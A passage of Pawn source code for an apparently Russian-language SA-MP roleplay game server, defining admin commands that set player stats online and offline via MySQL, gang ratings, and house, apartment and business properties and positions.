			PTEMP[giveplayerid][pDrugs] = amount;
			format(string, 128, " Количество наркотиков изменено на: %i", amount);
		}
	case 18:
		{
			PTEMP[giveplayerid][pMember] = amount;
			PTEMP[giveplayerid][pRank] = 1;
			format(string, 128, " Организация: %i", amount);
		}
	case 19:
		{
			PTEMP[giveplayerid][pDonateAccount] = amount;
			format(string, 128, " Донат счётчик изменён на: %i вирт", amount);
		}
	case 20:
		{
			PTEMP[giveplayerid][pBoxSkill] = amount;
			format(string, 128, " Уровень боевых искусств Box: %i", amount);
		}
	case 21:
		{
			PTEMP[giveplayerid][pKongfuSkill] = amount;
			format(string, 128, " Уровень боевых искусств Kong Fu: %i", amount);
		}
	case 22:
		{
			PTEMP[giveplayerid][pKickboxSkill] = amount;
			format(string, 128, " Уровень боевых искусств Kick Box: %i", amount);
		}
	case 23:
		{
		    new cars;
		    if(sscanf(params, "uddd",giveplayerid,stat,cars,amount)) return SCM(playerid, -1, " Введите: /setstat [id] [номер] [id авто] [количество]");
			if(cars < 0 || cars > 4) return SCM(playerid, COLOR_GREY, " Номер автомобиля может быть от 0 до 4");
			CarInfo[giveplayerid][carModel][cars] = amount;
			CarInfo[giveplayerid][carFuel][cars] = 200;
			CarInfo[giveplayerid][carPercent][cars] = 100;
			format(string, 128, " Машина: %i", amount);
		}
	case 24:
		{
			new cars;
		    if(sscanf(params, "uddd",giveplayerid,stat,cars,amount)) return SCM(playerid, -1, " Введите: /setstat [id] [номер] [id авто] [количество]");
			if(cars < 0 || cars > 4) return SCM(playerid, COLOR_GREY, " Номер автомобиля может быть от 0 до 4");
			CarInfo[giveplayerid][carColor_one][cars] = amount;
			format(string, 128, " Цвет 1: %i", amount);
		}
	case 25:
		{
			new cars;
		    if(sscanf(params, "uddd",giveplayerid,stat,cars,amount)) return SCM(playerid, -1, " Введите: /setstat [id] [номер] [id авто] [количество]");
			if(cars < 0 || cars > 4) return SCM(playerid, COLOR_GREY, " Номер автомобиля может быть от 0 до 4");
			CarInfo[giveplayerid][carColor_two][cars] = amount;
			format(string, 128, " Цвет 2: %i", amount);
		}
	case 26:
		{
			PTEMP[giveplayerid][pAddiction] = amount;
			format(string, 128, " Зависимость %i", amount);
		}
	case 27:
		{
			PTEMP[giveplayerid][pModel] = amount;
			format(string, 128, " Скин организации игрока: %i", amount);
		}
	case 28:
		{
			format(string,128," Временно отключено");
		}
	case 29:
		{
			new cars;
		    if(sscanf(params, "uddd",giveplayerid,stat,cars,amount)) return SCM(playerid, -1, " Введите: /setstat [id] [номер] [id авто] [количество]");
			if(cars < 0 || cars > 4) return SCM(playerid, COLOR_GREY, " Номер автомобиля может быть от 0 до 4");
			if(amount < 4 || amount > 100) return SCM(playerid, COLOR_GREY, " Проценты авто не могут быть больше 100 или меньше 4!");
			CarInfo[giveplayerid][carPercent][cars] = amount;
			format(string, 128, " Проценты Автмобиля: %i", amount);
		}
	case 30:
		{
		    new day, month, year;
		    gettime(year, month, day);
			SendMes(giveplayerid,COLOR_GREEN," Вы стали владельцем СТО %i", amount);
			strmid(WorkshopInfo[amount][wOwner],"None",0,strlen("None"),MAX_PLAYER_NAME);
			strmid(WorkshopInfo[amount][wDeputy1],"None",0,strlen("None"),MAX_PLAYER_NAME);
			strmid(WorkshopInfo[amount][wDeputy2],"None",0,strlen("None"),MAX_PLAYER_NAME);
			strmid(WorkshopInfo[amount][wDeputy3],"None",0,strlen("None"),MAX_PLAYER_NAME);
			strmid(WorkshopInfo[amount][wMechanic1],"None",0,strlen("None"),MAX_PLAYER_NAME);
			strmid(WorkshopInfo[amount][wMechanic2],"None",0,strlen("None"),MAX_PLAYER_NAME);
			strmid(WorkshopInfo[amount][wMechanic3],"None",0,strlen("None"),MAX_PLAYER_NAME);
			strmid(WorkshopInfo[amount][wMechanic4],"None",0,strlen("None"),MAX_PLAYER_NAME);
			strmid(WorkshopInfo[amount][wMechanic5],"None",0,strlen("None"),MAX_PLAYER_NAME);
			WorkshopInfo[amount][wLandTax] = 6000;
			WorkshopInfo[amount][wBank] = (WorkshopInfo[amount][wAuction][0]/100)*20;
			WorkshopInfo[amount][wProds] = 20000;
			WorkshopInfo[amount][wPriceProds] = 50;
			WorkshopInfo[amount][wZp] = 5;
			strmid(WorkshopInfo[amount][wOwner],PTEMP[giveplayerid][pName], 0, 32, 32);
			WGet(giveplayerid);
			strmid(WorkshopInfo[amount][wAuctionName], "None", 0, strlen("None"), 10);
			WorkshopInfo[amount][wAuction][0] = 0;
			WorkshopInfo[amount][wAuction][1] = 0;
			WorkshopInfo[amount][wAuction][2] = 0;
			WorkshopInfo[amount][wAuction][3] = 0;
			WorkshopInfo[amount][wAuction][4] = mktimes(0,0,0,day+14,month,year);

			PTEMP[giveplayerid][pAvtomas] = amount;
			//strmid(WorkshopInfo[amount][wOwner], PTEMP[giveplayerid][pName], 0, strlen(PTEMP[giveplayerid][pName]), MAX_PLAYER_NAME);
			format(string, 128, " Мастерская игрока: %i", amount);
		}
	case 31:
		{
			PTEMP[giveplayerid][ptaxilvl] = amount;
			format(string, 128, " Скилл таксиста: %i", amount);
		}
	case 32:
		{
			PTEMP[giveplayerid][pDrivingSkill] = amount;
			format(string, 128, " Навык вождения: %i", amount);
		}
	case 33:
	    {
	        if(amount < 0 || amount > 5) return SCM(playerid, COLOR_GREY, " Ключей можно выдать от 0 и до 5");
	        PTEMP[giveplayerid][pKeys] = amount;
	        format(string, 128, " Ключи от камер: %i", amount);
	    }
	case 34:
	    {
			PTEMP[giveplayerid][pGRating] = amount;
			format(string, 128, " Рейтинг бандита установлен на %i", amount);
	    }
	}
	SCM(playerid, COLOR_GRAD1, string);
	printf("Администратор %s установил %s stats [ID: %i] [VALUE: %i]", Name(playerid), Name(giveplayerid), stat, amount);
	return true;
}
CMD:offsetstat(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	new giveplayerid[32];
	new stat;
	new amount;
	if(PTEMP[playerid][pAdmin] < 9 || dostup[playerid] == 0) return true;
	if(sscanf(params, "s[32]dd",giveplayerid,stat,amount))
	{
		SCM(playerid, -1, " Введите: /setstat [Nik] [номер] [количество]");
		SCM(playerid, COLOR_GREY, " [1] Уровень|[2] Законопослушность|[3] Материалы|[4] Скин|[5] Преступлений|[6] Номер телефона");
		SCM(playerid, COLOR_GREY, " [7] Exp|[8] Ключ от дома |[9] Номер бизнеса|[10] VIP [1-3]|[11] Работа игрока|[12] Сытость");
		SCM(playerid, COLOR_GREY, " [13] Деньги в банке|[14] Счёт мобильного|[15] Деньги|[16] Варны|[17] Наркотики");
		SCM(playerid, COLOR_GREY, " [18] Член орг|[19] Донат счётчик|[20] Box|[21] Kong Fu|[22] Kick Box");
		SCM(playerid, COLOR_GREY, " [23] Машина|[24] Цвет авто 1|[25] Цвет авто 2|[26] Наркозависимость|[27] Скин организации");
		SCM(playerid, COLOR_GREY, " [28] Помолвлен на|[29] Проценты Авто|[30] Мастерская|[31] Скилл таксиста|[32] Навык вождения");
		SCM(playerid, COLOR_GREY, " [33] Ключи от камеры|[34] Рейтинг бандита");
		return true;
	}
	switch (stat)
	{
	case 1:
		{
			mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pLevel = '%i' WHERE name = '%e'",amount,giveplayerid);
			format(string, 128, " LVL игрока изменён на: %i", amount);
			//DollahScoreUpdate(giveplayerid);
		}
	case 2:
		{
		    mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pZakonp = '%i' WHERE name = '%e'",amount,giveplayerid);
			format(string, 128, " Законопослушность: %i", amount);
		}
	case 3:
		{
            mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pMats = '%i' WHERE name = '%e'",amount,giveplayerid);
			format(string, 128, " Материалы: %i", amount);
		}
	case 4:
		{
   			//PTEMP[giveplayerid][pChar][0] = amount;
			format(string, 128, " Скин игрока установлен на: %i", amount);
		}
	case 5:
		{
			mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pCrimes = '%i' WHERE name = '%e'",amount,giveplayerid);
			format(string, 128, " Преступлений: %i", amount);
		}
	case 6:
		{
			mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pPNumbers = '%i' WHERE name = '%e'",amount,giveplayerid);
			format(string, 128, " Номер телефона игрока изменён на: %i", amount);
		}
	case 7:
		{
			mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pExp = '%i' WHERE name = '%e'",amount,giveplayerid);
			format(string, 128, " EXP игрока изменены на: %i", amount);
		}
	case 8:
		{
			mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pPHouseKey = '%i' WHERE name = '%e'",amount,giveplayerid);
			format(string, 128, " Дом: %i", amount);
		}
	case 9:
		{
		    BizzInfo[amount][bLocked] = 0;
			BizzInfo[amount][bPrice] = 100;
			BizzInfo[amount][bTill] = 0;
			BizzInfo[amount][bLandTax] = BizzLandTax[amount]*12;
			BizzPay[amount] = 0;
			BizzInfo[amount][bLicense] = 0;
			BizzInfo[amount][bStavka] = 0;
			BizzInfo[amount][bMinStavka] = 0;
			BizzInfo[amount][bTimeStavka] = 0;
			BizzInfo[amount][bLastStavka] = 0;
			BizzInfo[amount][bLockTime] = 0;
			BizzInfo[amount][bEntranceCost] = 100;
			strmid(BizzInfo[amount][bOwner],giveplayerid, 0, 32, 32);
			strmid(BizzInfo[amount][bNameStavka], "-", 0, strlen("-"), 10);
			format(string, 128, " Бизнес: %i", amount);
		}
	case 10:
		{
			mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pDonateRank = '%i' WHERE name = '%e'",amount,giveplayerid);
			format(string, 128, " VIP аккаунт уровня: %i", amount);
		}
	case 11:
		{
			mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pJob = '%i' WHERE name = '%e'",amount,giveplayerid);
			format(string, 128, " Работа: %i", amount);
		}
	case 12:
		{
			mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pSatiety = '%i' WHERE name = '%e'",amount,giveplayerid);
			format(string, 128, " Сытость игрока: %i", amount);
		}
	case 13:
		{
			mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pBank = '%i' WHERE name = '%e'",amount,giveplayerid);
			format(string, 128, " Деньги в банке изменены на: %i вирт", amount);
		}
	case 14:
		{
			mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pMobile = '%i' WHERE name = '%e'",amount,giveplayerid);
			format(string, 128, " Счёт мобильного: %i вирт", amount);
		}
	case 15:
		{
			mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pCash = '%i' WHERE name = '%e'",amount,giveplayerid);
			format(string, 128, " Деньги изменены на: %i вирт", amount);
		}
	case 16:
		{
			mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pWarns = '%i' WHERE name = '%e'",amount,giveplayerid);
			format(string, 128, " Количество варнов изменено на: %i", amount);
		}
	case 17:
		{
			mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pDrugs = '%i' WHERE name = '%e'",amount,giveplayerid);
			format(string, 128, " Количество наркотиков изменено на: %i", amount);
		}
	case 18:
		{
			mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pMember = '%i', pRank = '1' WHERE name = '%e'",amount,giveplayerid);
			format(string, 128, " Организация: %i", amount);
		}
	case 19:
		{
   			mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pDonateAccount = '%i' WHERE name = '%e'",amount,giveplayerid);
			format(string, 128, " Донат счётчик изменён на: %i вирт", amount);
		}
	case 20:
		{
			mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pBoxSkill = '%i' WHERE name = '%e'",amount,giveplayerid);
			format(string, 128, " Уровень боевых искусств Box: %i", amount);
		}
	case 21:
		{
			mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pKongfuSkill = '%i' WHERE name = '%e'",amount,giveplayerid);
			format(string, 128, " Уровень боевых искусств Kong Fu: %i", amount);
		}
	case 22:
		{
			mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pKickboxSkill = '%i' WHERE name = '%e'",amount,giveplayerid);
			format(string, 128, " Уровень боевых искусств Kick Box: %i", amount);
		}
	case 23:
		{
		    new cars;
		    if(sscanf(params, "s[32]ddd",giveplayerid,stat,cars,amount)) return SCM(playerid, -1, " Введите: /setstat [Nik] [номер] [id авто] [количество]");
			if(cars < 0 || cars > 4) return SCM(playerid, COLOR_GREY, " Номер автомобиля может быть от 0 до 4");

			format(string, 128, " Машина: %i", amount);
		}
	case 24:
		{
			new cars;
		    if(sscanf(params, "s[32]ddd",giveplayerid,stat,cars,amount)) return SCM(playerid, -1, " Введите: /setstat [Nik] [номер] [id авто] [количество]");
			if(cars < 0 || cars > 4) return SCM(playerid, COLOR_GREY, " Номер автомобиля может быть от 0 до 4");

			format(string, 128, " Цвет 1: %i", amount);
		}
	case 25:
		{
			new cars;
		    if(sscanf(params, "s[32]ddd",giveplayerid,stat,cars,amount)) return SCM(playerid, -1, " Введите: /setstat [Nik] [номер] [id авто] [количество]");
			if(cars < 0 || cars > 4) return SCM(playerid, COLOR_GREY, " Номер автомобиля может быть от 0 до 4");

			format(string, 128, " Цвет 2: %i", amount);
		}
	case 26:
		{
			mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pAddiction = '%i' WHERE name = '%e'",amount,giveplayerid);
			format(string, 128, " Зависимость %i", amount);
		}
	case 27:
		{
			mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pModel = '%i' WHERE name = '%e'",amount,giveplayerid);
			format(string, 128, " Скин организации игрока: %i", amount);
		}
	case 28:
		{
			format(string,128," Временно отключено");
		}
	case 29:
		{
			new cars;
		    if(sscanf(params, "s[32]ddd",giveplayerid,stat,cars,amount)) return SCM(playerid, -1, " Введите: /setstat [Nik] [номер] [id авто] [количество]");
			if(cars < 0 || cars > 4) return SCM(playerid, COLOR_GREY, " Номер автомобиля может быть от 0 до 4");
			if(amount < 4 || amount > 100) return SCM(playerid, COLOR_GREY, " Проценты авто не могут быть больше 100 или меньше 4!");
			
			format(string, 128, " Проценты Автмобиля: %i", amount);
		}
	case 30:
		{
		    new day, month, year;
		    gettime(year, month, day);
			//SendMes(giveplayerid,COLOR_GREEN," Вы стали владельцем СТО %i", amount);
			strmid(WorkshopInfo[amount][wOwner],"None",0,strlen("None"),MAX_PLAYER_NAME);
			strmid(WorkshopInfo[amount][wDeputy1],"None",0,strlen("None"),MAX_PLAYER_NAME);
			strmid(WorkshopInfo[amount][wDeputy2],"None",0,strlen("None"),MAX_PLAYER_NAME);
			strmid(WorkshopInfo[amount][wDeputy3],"None",0,strlen("None"),MAX_PLAYER_NAME);
			strmid(WorkshopInfo[amount][wMechanic1],"None",0,strlen("None"),MAX_PLAYER_NAME);
			strmid(WorkshopInfo[amount][wMechanic2],"None",0,strlen("None"),MAX_PLAYER_NAME);
			strmid(WorkshopInfo[amount][wMechanic3],"None",0,strlen("None"),MAX_PLAYER_NAME);
			strmid(WorkshopInfo[amount][wMechanic4],"None",0,strlen("None"),MAX_PLAYER_NAME);
			strmid(WorkshopInfo[amount][wMechanic5],"None",0,strlen("None"),MAX_PLAYER_NAME);
			WorkshopInfo[amount][wLandTax] = 6000;
			WorkshopInfo[amount][wBank] = (WorkshopInfo[amount][wAuction][0]/100)*20;
			WorkshopInfo[amount][wProds] = 20000;
			WorkshopInfo[amount][wPriceProds] = 50;
			WorkshopInfo[amount][wZp] = 5;
			strmid(WorkshopInfo[amount][wOwner],giveplayerid, 0, 32, 32);
			strmid(WorkshopInfo[amount][wAuctionName], "None", 0, strlen("None"), 10);
			WorkshopInfo[amount][wAuction][0] = 0;
			WorkshopInfo[amount][wAuction][1] = 0;
			WorkshopInfo[amount][wAuction][2] = 0;
			WorkshopInfo[amount][wAuction][3] = 0;
			WorkshopInfo[amount][wAuction][4] = mktimes(0,0,0,day+14,month,year);
            mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pAvtomas = '%i' WHERE name = '%e'",amount,giveplayerid);
			//strmid(WorkshopInfo[amount][wOwner], PTEMP[giveplayerid][pName], 0, strlen(PTEMP[giveplayerid][pName]), MAX_PLAYER_NAME);
			format(string, 128, " Мастерская игрока: %i", amount);
		}
	case 31:
		{
			mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET ptaxilvl = '%i' WHERE name = '%e'",amount,giveplayerid);
			format(string, 128, " Скилл таксиста: %i", amount);
		}
	case 32:
		{
			mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pDrivingSkill = '%i' WHERE name = '%e'",amount,giveplayerid);
			format(string, 128, " Навык вождения: %i", amount);
		}
	case 33:
	    {
	        if(amount < 0 || amount > 5) return SCM(playerid, COLOR_GREY, " Ключей можно выдать от 0 и до 5");
	        mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pKeys = '%i' WHERE name = '%e'",amount,giveplayerid);
	        format(string, 128, " Ключи от камер: %i", amount);
	    }
	case 34:
	    {
			mysql_format(DATABASE, QUERY, 128, "UPDATE `"TABLE_ACCOUNTS"` SET pGRating = '%i' WHERE name = '%e'",amount,giveplayerid);
			format(string, 128, " Рейтинг бандита установлен на %i", amount);
	    }
	}
	mysql_function_query(DATABASE,QUERY,false,"","");
	SCM(playerid, COLOR_GRAD1, string);
	printf("Администратор %s установил %s offline-stats [ID: %i] [VALUE: %i]", Name(playerid), giveplayerid, stat, amount);
	return true;
}
CMD:setgrating(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 8) return true;
	new sss[32];
	if(sscanf(params, "s[32]i", sss, params[0])) return SCM(playerid, -1, " Введите: /setgrating [Gang] [Rating]");
	if(params[0] < 0) return SCM(playerid, COLOR_GREY, " Вы ошиблись при вводе рейтинга банды");
	if(!strcmp(sss, "Grove", true))
	{
	    gRating[Grove] = params[0];
	}
	else if(!strcmp(sss, "Ballas", true))
	{
	    gRating[Ballas] = params[0];
	}
	else if(!strcmp(sss, "Vagos", true))
	{
	    gRating[Vagos] = params[0];
	}
	else if(!strcmp(sss, "Aztec", true))
	{
	    gRating[Aztec] = params[0];
	}
	else if(!strcmp(sss, "Rifa", true))
	{
	    gRating[Rifa] = params[0];
	}
	else return SCM(playerid, COLOR_GREY, " Вы ошиблись при вводе названия банды");
	format(string, sizeof(string), " Банде %s начислено %i очков рейтинга", sss, params[0]);
	SCM(playerid, COLOR_GREEN, string);
	printf("Администратор %s начислил банде %s %i очков рейтинга", Name(playerid), sss, params[0]);
	return true;
}
CMD:setklass(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 7 || dostup[playerid] == 0) return true;
	if(sscanf(params, "dd",params[0],params[1])) return SCM(playerid, -1, " Введите: /setklass [дом] [класс]");
	HouseInfo[params[0]][hKlass] = params[1];
	SCM(playerid, -1, " Класс установлен");
	printf("Администратор %s установил дому %i %i класс", Name(playerid), params[0], params[1]);
	return true;
}
CMD:getschet(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 6 || dostup[playerid] == 0) return true;
	if(sscanf(params, "d",params[0])) return SCM(playerid, -1, " Введите: /getschet [дом]");
	format(YCMDstr, sizeof(YCMDstr), " Счёт домашний: %i",HouseInfo[params[0]][hTakings]);
	SCM(playerid, -1, YCMDstr);
	return true;
}
CMD:setschet(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 7 || dostup[playerid] == 0) return true;
	if(sscanf(params, "dd",params[0],params[1])) return SCM(playerid, -1, " Введите: /setschet [дом] [счет]");
	HouseInfo[params[0]][hTakings] = params[1];
	SCM(playerid, -1, " Домашний счет установлен");
	printf("Администратор %s установил дому %i счёт %i вирт", Name(playerid), params[0], params[1]);
	return true;
}
CMD:setcost(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 7 || dostup[playerid] == 0) return true;
	if(sscanf(params, "dd",params[0],params[1])) return SCM(playerid, -1, " Введите: /setscost [дом] [цена]");
	HouseInfo[params[0]][hValue] = params[1];
	SCM(playerid, -1, " Стоимость установлена");
	printf("Администратор %s установил дому %i стоимость %i вирт", Name(playerid), params[0], params[1]);
	return true;
}
CMD:sethousepos(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 7 || dostup[playerid] == 0) return true;
	if(sscanf(params, "d",params[0])) return SCM(playerid, -1, " Введите: /sethousepos [дом]");
	new Float: lwx, Float:lwy, Float:lwz;
	GetPlayerPos(playerid, lwx, lwy, lwz);
	HouseInfo[params[0]][hEntrancex] = lwx;
	HouseInfo[params[0]][hEntrancey]= lwy;
	HouseInfo[params[0]][hEntrancez] = lwz;
	BuyHouse(params[0]);
    printf("Администратор %s установил координаты дома %i на %f, %f, %f", Name(playerid), params[0], lwx, lwy, lwz);
	return true;
}
CMD:setkvartpos(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 7 || dostup[playerid] == 0) return true;
	if(sscanf(params, "d",params[0])) return SCM(playerid, -1, " Введите: /setkvartpos [квартира]");
	if(params[0] < 1) return SCM(playerid,COLOR_GREY," Номер квартиры не может быть менее 1");
	new Float: lwx, Float:lwy, Float:lwz;
	GetPlayerPos(playerid, lwx, lwy, lwz);
	kvartinfo[params[0]][pXpic] = lwx;
	kvartinfo[params[0]][pYpic] = lwy;
	kvartinfo[params[0]][pZpic] = lwz;
	kvartinfo[params[0]][kworld] = GetPlayerVirtualWorld(playerid);
	kvartinfo[params[0]][virtmir] = GetPVarInt(playerid, "podeezd");
	DestroyDynamic3DTextLabel(kvartinfo[params[0]][dtext]);
	format(YCMDstr, sizeof(YCMDstr),"{0076FC}Комната #%i\nПродается: %i вирт\nЧтобы войти, нажмите клавишу 'ENTER'",params[0],kvartinfo[params[0]][kCena]);
	kvartinfo[params[0]][dtext]     =    CreateDynamic3DTextLabel(YCMDstr,0x0076FCFF,kvartinfo[params[0]][pXpic],kvartinfo[params[0]][pYpic],kvartinfo[params[0]][pZpic]+1,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,0,kvartinfo[params[0]][kworld]);
	updatekvar(params[0]);
	printf("Администратор %s установил координаты квартиры %i на %f, %f, %f", Name(playerid), params[0], lwx, lwy, lwz);
	return true;
}
CMD:setkvartcarpos(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 7 || dostup[playerid] == 0) return true;
	if(sscanf(params, "d",params[0])) return SCM(playerid, -1, " Введите: /setkvartcarpos [подъезд]");
	new Float: lwx, Float:lwy, Float:lwz,Float:a;
	GetPlayerPos(playerid, lwx, lwy, lwz);
	GetPlayerFacingAngle(playerid,a);
	if(params[0] < 1) return SCM(playerid,COLOR_GREY," Номер подъезда не может быть менее 1");
	PodeezdInfo[params[0]][carX] = lwx;
	PodeezdInfo[params[0]][carY]= lwy;
	PodeezdInfo[params[0]][carZ] = lwz;
	PodeezdInfo[params[0]][carC] = a;
	SCM(playerid, COLOR_GREY, " Координаты машины установлены");
	printf("Администратор %s установил координаты авто подьезда %i на %f, %f, %f", Name(playerid), params[0], lwx, lwy, lwz);
	return true;
}
CMD:sethousecarpos(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 7 || dostup[playerid] == 0) return true;
	if(sscanf(params, "d",params[0])) return SCM(playerid, -1, " Введите: /sethousecarpos [дом]");
	new Float: lwx, Float:lwy, Float:lwz,Float:a;
	GetPlayerPos(playerid, lwx, lwy, lwz);
	GetPlayerFacingAngle(playerid,a);
	HouseInfo[params[0]][hCarx] = lwx;
	HouseInfo[params[0]][hCary]= lwy;
	HouseInfo[params[0]][hCarz] = lwz;
	HouseInfo[params[0]][hCarc] = a;
	SCM(playerid, COLOR_GREY, " Координаты машины установлены");
	printf("Администратор %s установил координаты авто дома %i на %f, %f, %f", Name(playerid), params[0], lwx, lwy, lwz);
	return true;
}
CMD:setbcost(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 7 || dostup[playerid] == 0) return true;
	if(sscanf(params, "dd",params[0],params[1])) return SCM(playerid, -1, " Введите: /setbcost [бизнес] [цена]");
	BizzInfo[params[0]][bBuyPrice] = params[1];
	SCM(playerid, -1, " Стоимость бизнеса установлена");
	return true;
}
CMD:setbproducts(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 8 || dostup[playerid] == 0) return true;
	if(sscanf(params, "dd",params[0],params[1])) return SCM(playerid, -1, " Введите: /setbproducts [бизнес] [продукты]");
	BizzInfo[params[0]][bProducts] = params[1];
	SCM(playerid, -1, "Количество продуктов установлено");
	return true;
}
CMD:setbizbar(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 8 || dostup[playerid] == 0) return true;
	if(sscanf(params, "d",params[0])) return SCM(playerid, -1, " Введите: /setbizbar [бизнес]");
	new Float:X,Float:Y,Float:Z; GetPlayerPos(playerid,X,Y,Z);
	BizzInfo[params[0]][bBarX] = X;
	BizzInfo[params[0]][bBarY]= Y;
	BizzInfo[params[0]][bBarZ] = Z;
	SCM(playerid, COLOR_GREY, "Координаты бара установлены");
	return true;
}
CMD:setallbizworld(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 8 || dostup[playerid] == 0) return true;
	for(new i = 1; i <= TotalBizz; i++) BizzInfo[i][bVirtualWorld] = i;
	SCM(playerid, COLOR_GREY, "Виртуальные миры распределены");
	return true;
}
CMD:setbizexit(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 8 || dostup[playerid] == 0) return true;
	if(sscanf(params, "d",params[0])) return SCM(playerid, -1, " Введите: /setbizexit [бизнес]");
	if(params[0] > TotalBizz) return SCM(playerid,COLOR_GREY," Неверный ID");
	new Float:X,Float:Y,Float:Z; GetPlayerPos(playerid,X,Y,Z);
	DestroyDynamicPickup(BizzInfo[params[0]][bExitPic]);
	BizzInfo[params[0]][bExitX] = X;
	BizzInfo[params[0]][bExitY]= Y;
	BizzInfo[params[0]][bExitZ] = Z;
	BizzInfo[params[0]][bExitPic] = CreatePickup(19132, 23, BizzInfo[params[0]][bExitX], BizzInfo[params[0]][bExitY], BizzInfo[params[0]][bExitZ],BizzInfo[params[0]][bVirtualWorld]);
	SCM(playerid, COLOR_GREY, "Координаты выхода установлены");
	return true;
}
CMD:edit(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 9 || dostup[playerid] == 0) return true;
	ShowPlayerDialogEx(playerid, 3725, DIALOG_STYLE_LIST, "Выберите действие", " [1] Продать все дома\n [2] Продать все бизнесы\n [3] Установить дому интеръер\n [4] Установить дому интерьер часть 2\n [5] Распределить дома\n [6] Распределить цены на дома", "Выбрать", "Закрыть");
	return true;
}
CMD:addstall(playerid, params[])
{
	if(!PTEMP[playerid][pLogin]) return true;
	if(PTEMP[playerid][pAdmin] < 8 || dostup[playerid] == 0) return true;
	if(!GetPVarInt(playerid,"st_object"))
	{
		new Float: posX, Float: posY, Float: posZ;
		GetPlayerPos(playerid, posX, posY, posZ);
		new stobject = CreateDynamicObject(1340,posX,posY,posZ,0,0,0);
		SetPVarInt(playerid,"st_object",stobject);
		EditDynamicObject(playerid,stobject);
		SCM(playerid,COLOR_GREEN,"Поставьте прилавок на нужное место. {ffffff}Для продолжения введите команду ещё раз");
	}
	else ShowPlayerDialogEx(playerid, 1783, DIALOG_STYLE_MSGBOX, "Хот доги", "Продолжить изменять положение объекта", "Да", "Нет");
	return true;
}
CMD:addatm(playerid, params[])
{
	if(!PTEMP[playerid][pLogin]) return true;
	if(PTEMP[playerid][pAdmin] < 8 || dostup[playerid] == 0) return true;
	if(!GetPVarInt(playerid,"st_object"))
	{
		new Float: posX, Float: posY, Float: posZ;
		GetPlayerPos(playerid, posX, posY, posZ);
		new stobject = CreateDynamicObject(2754,posX,posY,posZ,0,0,0);
		SetPVarInt(playerid,"st_object",stobject);
		EditDynamicObject(playerid,stobject);
		SCM(playerid,COLOR_GREEN,"Поставьте банкомат на нужное место. {ffffff}Для продолжения введите команду ещё раз");
	}
	else ShowPlayerDialogEx(playerid, 1883, DIALOG_STYLE_MSGBOX, "Банкоматы", "Продолжить изменять положение объекта", "Да", "Нет");
	return true;
}
CMD:addhouse(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 7 || dostup[playerid] == 0) return true;
	if(sscanf(params, "dd",params[0],params[1]))
	{
		SCM(playerid, -1, " Введите: /addhouse [класс] [цена]");
